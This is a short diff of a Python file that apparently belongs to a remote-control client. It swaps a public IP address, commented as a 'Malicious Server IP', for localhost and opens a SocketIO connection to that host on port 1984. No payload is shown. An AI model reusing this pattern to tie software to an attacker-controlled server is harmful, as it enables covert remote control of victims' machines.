@@ -6,7 +6,7 @@ from urllib2 import urlopen
 from socketIO_client import SocketIO
 import os
 
-bigBro = '75.138.89.68' # Malicious Server IP.
+bigBro = '127.0.0.1' # Malicious Server IP.
 socket = SocketIO("http://" + bigBro, 1984)
 
 # Functions for socket listeners.
